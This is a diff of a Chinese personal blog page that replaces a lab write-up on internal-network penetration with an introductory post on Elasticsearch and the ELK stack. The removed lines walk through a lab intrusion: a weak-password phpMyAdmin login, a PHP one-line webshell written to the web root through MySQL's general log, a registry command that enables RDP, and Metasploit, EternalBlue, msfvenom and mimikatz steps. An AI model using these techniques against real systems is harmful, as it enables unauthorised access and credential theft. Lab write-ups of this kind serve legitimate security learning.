@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="内网," />
+  <meta name="keywords" content="ELK,日志采集分析," />
 
 
 
@@ -79,16 +79,17 @@
 
 
 
-<meta name="description" content="参考于https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;204769.html 准备两台电脑 一台利用vm建立一个内网环境： 一台安装kali linux： 安装和配置具体参考春秋学院的文章">
+<meta name="description" content="1.全文检索的需求：因为数据库已经解决不了海量数据的快速查询，所以引入了全文检索。最原生的是lucene，经过封装出现solr，solr在建立索引的时候，检索能力就会下降。后来出现了es 2.ELK日志协议栈 e：elasticsearch 全文检索的框架，基于lucene l：logstash   日志数据收集采集框架，类似于flume k：kibana 报表展示工具，类似于echarts 使用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="我的内网渗透">
-<meta property="og:url" content="http://yoursite.com/2020/05/25/%E6%88%91%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:title" content="ELK学习">
+<meta property="og:url" content="http://yoursite.com/2020/06/05/ELK%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="QuanYex&#39;s Blog">
-<meta property="og:description" content="参考于https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;204769.html 准备两台电脑 一台利用vm建立一个内网环境： 一台安装kali linux： 安装和配置具体参考春秋学院的文章">
-<meta property="article:published_time" content="2020-05-25T09:07:59.000Z">
-<meta property="article:modified_time" content="2020-06-03T10:25:54.922Z">
+<meta property="og:description" content="1.全文检索的需求：因为数据库已经解决不了海量数据的快速查询，所以引入了全文检索。最原生的是lucene，经过封装出现solr，solr在建立索引的时候，检索能力就会下降。后来出现了es 2.ELK日志协议栈 e：elasticsearch 全文检索的框架，基于lucene l：logstash   日志数据收集采集框架，类似于flume k：kibana 报表展示工具，类似于echarts 使用">
+<meta property="article:published_time" content="2020-06-05T10:57:06.000Z">
+<meta property="article:modified_time" content="2020-06-08T03:21:32.452Z">
 <meta property="article:author" content="QuanYex">
-<meta property="article:tag" content="内网">
+<meta property="article:tag" content="ELK">
+<meta property="article:tag" content="日志采集分析">
 <meta name="twitter:card" content="summary">
 
 
@@ -119,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/05/25/我的内网渗透/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/06/05/ELK学习/"/>
 
 
 
 
 
-  <title>我的内网渗透 | QuanYex's Blog</title>
+  <title>ELK学习 | QuanYex's Blog</title>
   
 
 
@@ -252,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/25/%E6%88%91%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/05/ELK%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="QuanYex">
@@ -269,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">我的内网渗透</h1>
+          <h1 class="post-title" itemprop="name headline">ELK学习</h1>
         
 
         <div class="post-meta">
@@ -281,8 +282,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-25T17:07:59+08:00">
-                2020-05-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-05T18:57:06+08:00">
+                2020-06-05
               </time>
             
 
@@ -297,8 +298,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-06-03T18:25:54+08:00">
-                2020-06-03
+              <time title="更新于" itemprop="dateModified" datetime="2020-06-08T11:21:32+08:00">
+                2020-06-08
               </time>
             
           </span>
@@ -316,8 +317,19 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index">
-                    <span itemprop="name">实践</span>
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">学习</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/%E5%B7%A5%E4%BD%9C/" itemprop="url" rel="index">
+                    <span itemprop="name">工作</span>
                   </a>
                 </span>
 
@@ -353,44 +365,26 @@
       
 
       
-        <p>参考于<code>https://www.freebuf.com/articles/network/204769.html</code></p>
-<p>准备两台电脑</p>
-<p>一台利用vm建立一个内网环境：</p>
-<p>一台安装kali linux：</p>
-<p>安装和配置具体参考春秋学院的文章</p>
+        <p>1.全文检索的需求：因为数据库已经解决不了海量数据的快速查询，所以引入了全文检索。最原生的是lucene，经过封装出现solr，solr在建立索引的时候，检索能力就会下降。后来出现了es</p>
+<p>2.ELK日志协议栈</p>
+<p>e：elasticsearch 全文检索的框架，基于lucene</p>
+<p>l：logstash   日志数据收集采集框架，类似于flume</p>
+<p>k：kibana 报表展示工具，类似于echarts</p>
+<p>使用logstash采集数据，采集的数据全部存储到es里面去，使用kubana展示es索引库当中的数据。</p>
 <a id="more"></a>
 
-<p>安装好之后，打开kali  网址中直接输入 : —.—.—.105/phpinfo,在其中找到根目录，</p>
-<p>然后直接进入phpmyadmin页面弱口令登录，</p>
-<p>进入数据库之后在sql页面查看数据库配置：</p>
-<p><code>select @@basedir</code>发现文件目录是：C:/phpstudy1/PHPTutorial/MySQL/，</p>
-<p>接着写入一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;select  &#39;&lt;? @php@ @assert($_POST[pass]); @?&gt;&#39; into outfile &#39;C:\\phpstudy1\\PHPTutorial\\WWW \\system.php&#39;&#96;</span><br></pre></td></tr></table></figure>
-
-<p>发现失败，提示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>
-
-<p>出现这个错误是因为没有给数据库指定写出文件的路径或者写出的路径有问题。</p>
-<p>首先使用下面的命令<code>show variables like &#39;%secure%&#39;</code> 查看数据库的存储路径。如果查出的 secure_file_priv 是 null 的时候就证明在 my.ini 文件里面没有配置写出路径。</p>
-<p>用命令后发现果然是NULL</p>
-<p><code>SHOW VARIABLES LIKE &#39;%general_log%&#39;</code> 查询日志  发现    general_log      | OFF </p>
-<p><strong>General_log 详解</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">开启 general log 将所有到达MySQL Server的SQL语句记录下来。</span><br><span class="line"></span><br><span class="line">一般不会开启开功能，因为log的量会非常庞大。但个别情况下可能会临时的开一会儿general log以供排障使用。 </span><br><span class="line">相关参数一共有3：general_log、log_output、general_log_file</span><br><span class="line"></span><br><span class="line">mysql</span><br><span class="line">show variables like &#39;general_log&#39;;  -- 查看日志是否开启</span><br><span class="line">set global general_log&#x3D;on; -- 开启日志功能</span><br><span class="line">show variables like &#39;general_log_file&#39;;  -- 看看日志文件保存位置</span><br><span class="line">set global general_log_file&#x3D;&#39;tmp&#x2F;general.lg&#39;; -- 设置日志文件保存位置</span><br></pre></td></tr></table></figure>
-
-<p>现在开启日志 <code>set global general_log=on</code></p>
-<p>设置保存地址<code>set global general_log_file=&#39;C:\\phpstudy1\\PHPTutorial\\WWW\\system.php&#39;</code></p>
-<p>这是后进行查询就会自动写入日志<code>select  &#39;&lt;? @php assert@($_POST[pass]);@ ?&gt;&#39;</code></p>
-<p>通过 phpinfo 页面查看网站根目录，弱口令进 phpmyadmin 。</p>
-<p>写 shell 连菜刀，因为不能直接写，所以我们利用日志文件来写入shell。</p>
-<p>添加用户，赋予管理员权限。</p>
-<p>目标机没有开3389，我们尝试输入以下命令开3389，远程连接。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
-
-<p>这样我们就拿到了第一台主机的权限。接下来我们利用kali的msf 对目标机的ip段进行扫描。</p>
-<p>发现windows2008上安装有 sqlserver 服务，我们利用 msf 的相关模块对 sa 密码进行爆破，并尝试使用 msf 中mssql_payload 模块来获取交互式shell。刚才已经利用msf 得到了 sa 用户的密码，我们可以利用 xp_cmdshell 进行提权，添加用户，远程连接。</p>
-<p>windows7、windows2003这两个版本都是存在永恒之蓝漏洞的，我们直接利用 msf 的相关模块打就行了，拿到权限，添加用户，开3389，远程连接。</p>
-<p>windows2012利用msvenom 生成木马文件，上传到目标主机，可开3389 远程连接，然后我们上传 mimikatz 来获取域控管理员密码哈希。</p>
-<p>windows 10找一台已经拿到的机器，然后在该机器上建立 IPC 连接，利用 IPC$ 入侵win10，将 win10 的某个盘符映射到该机，上传执行木马文件，获取 msf shell。</p>
+<h1 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h1><p>elk中文手册：<a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html</a></p>
+<p>elk中文社区：<a href="https://elasticsearch.cn/" target="_blank" rel="noopener">https://elasticsearch.cn/</a></p>
+<h2 id="ES介绍"><a href="#ES介绍" class="headerlink" title="ES介绍"></a>ES介绍</h2><h3 id="es与传统关系型数据库："><a href="#es与传统关系型数据库：" class="headerlink" title="es与传统关系型数据库："></a>es与传统关系型数据库：</h3><p>Relational DB -&gt;  Databases -&gt; Tables -&gt; Rows -&gt; Columns;</p>
+<p>Elasticsearch -&gt;   Indexes -&gt;      Types -&gt; Documents -&gt;Fields </p>
+<h3 id="es核心概念"><a href="#es核心概念" class="headerlink" title="es核心概念"></a>es核心概念</h3><p>1、索引index一个索引就是一个拥有几分相似特征的文档的集合。比如说，你可以有一个客户数据的索引，另一个产品目录的索引，还有一个订单数据的索引。一个索引由一个名字来标识（必须全部是小写字母的），并且当我们要对对应于这个索引中的文档进行索引、搜索、更新和删除的时候，都要使用到这个名字。在一个集群中，可以定义任意多的索引。</p>
+<p>2、类型type在一个索引中，你可以定义一种或多种类型。一个类型是你的索引的一个逻辑上的分类/分区，其语义完全由你来定。通常，会为具有一组共同字段的文档定义一个类型。比如说，我们假设你运营一个博客平台并且将你所有的数据存储到一个索引中。在这个索引中，你可以为用户数据定义一个类型，为博客数据定义另一个类型，当然，也可以为评论数据定义另一个类型。</p>
+<p>3、字段Field相当于是数据表的字段，对文档数据根据不同属性进行的分类标识</p>
+<p>4、映射mappingmapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。</p>
+<p>5、文档document一个文档是一个可被索引的基础信息单元。比如，你可以拥有某一个客户的文档，某一个产品的一个文档，当然，也可以拥有某个订单的一个文档。文档以JSON格式来表示，而JSON是一个到处存在的互联网数据交互格式。在一个index/type里面，你可以存储任意多的文档。注意，尽管一个文档，物理上存在于一个索引之中，文档必须被索引/赋予一个索引的type。</p>
+<p>6、集群cluster一个集群就是由一个或多个节点组织在一起，它们共同持有整个的数据，并一起提供索引和搜索功能。一个集群由一个唯一的名字标识，这个名字默认就是“elasticsearch”。这个名字是重要的，因为一个节点只能通过指定某个集群的名字，来加入这个集群</p>
+<p>7、节点node一个节点是集群中的一个服务器，作为集群的一部分，它存储数据，参与集群的索引和搜索功能。和集群类似，一个节点也是由一个名字来标识的，默认情况下，这个名字是一个随机的漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说挺重要的，因为在这个管理过程中，你会去确定网络中的哪些服务器对应于Elasticsearch集群中的哪些节点。一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做“elasticsearch”的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定它们能够相互发现彼此，它们将会自动地形成并加入到一个叫做“elasticsearch”的集群中。在一个集群里，只要你想，可以拥有任意多个节点。而且，如果当前你的网络中没有运行任何Elasticsearch节点，这时启动一个节点，会默认创建并加入一个叫做“elasticsearch”的集群。</p>
+<p>8、分片和复制shards&amp;replicas一个索引可以存储超出单个结点硬件限制的大量数据。比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；或者单个节点处理搜索请求，响应太慢。为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。当你创建一个索引的时候，你可以指定你想要的分片的数量。每个分片本身也是一个功能完善并且独立的“索引”，这个“索引”可以被放置到集群中的任何节点上。分片很重要，主要有两方面的原因：1）允许你水平分割/扩展你的内容容量。2）允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能/吞吐量。至于一个分片怎样分布，它的文档怎样聚合回搜索请求，是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。在一个网络/云的环境里，失败随时都可能发生，在某个分片/节点不知怎么的就处于离线状态，或者由于任何原因消失了，这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。复制之所以重要，有两个主要原因：在分片/节点失败的情况下，提供了高可用性。因为这个原因，注意到复制分片从不与原/主要（original/primary）分片置于同一节点上是非常重要的。扩展你的搜索量/吞吐量，因为搜索可以在所有的复制上并行运行。总之，每个索引可以被分成多个分片。一个索引也可以被复制0次（意思是没有复制）或多次。一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。分片和复制的数量可以在索引创建的时候指定。在索引创建之后，你可以在任何时候动态地改变复制的数量，但是你事后不能改变分片的数量。默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制，这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），这样的话每个索引总共就有10个分片。</p>
 
       
     </div>
@@ -408,7 +402,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+            <a href="/tags/ELK/" rel="tag"># ELK</a>
+          
+            <a href="/tags/%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E5%88%86%E6%9E%90/" rel="tag"># 日志采集分析</a>
           
         </div>
       
@@ -421,8 +417,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/05/14/%E6%90%9E%E5%AE%9AMySQL/" rel="next" title="搞定MySQL">
-                <i class="fa fa-chevron-left"></i> 搞定MySQL
+              <a href="/2020/06/03/Linux%E5%AD%A6%E4%B9%A0/" rel="next" title="Linux学习">
+                <i class="fa fa-chevron-left"></i> Linux学习
               </a>
             
           </div>
@@ -430,10 +426,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/06/03/Linux%E5%AD%A6%E4%B9%A0/" rel="prev" title="Linux学习">
-                Linux学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -485,8 +477,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -550,6 +551,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ElasticSearch"><span class="nav-number">1.</span> <span class="nav-text">ElasticSearch</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ES介绍"><span class="nav-number">1.1.</span> <span class="nav-text">ES介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#es与传统关系型数据库："><span class="nav-number">1.1.1.</span> <span class="nav-text">es与传统关系型数据库：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#es核心概念"><span class="nav-number">1.1.2.</span> <span class="nav-text">es核心概念</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
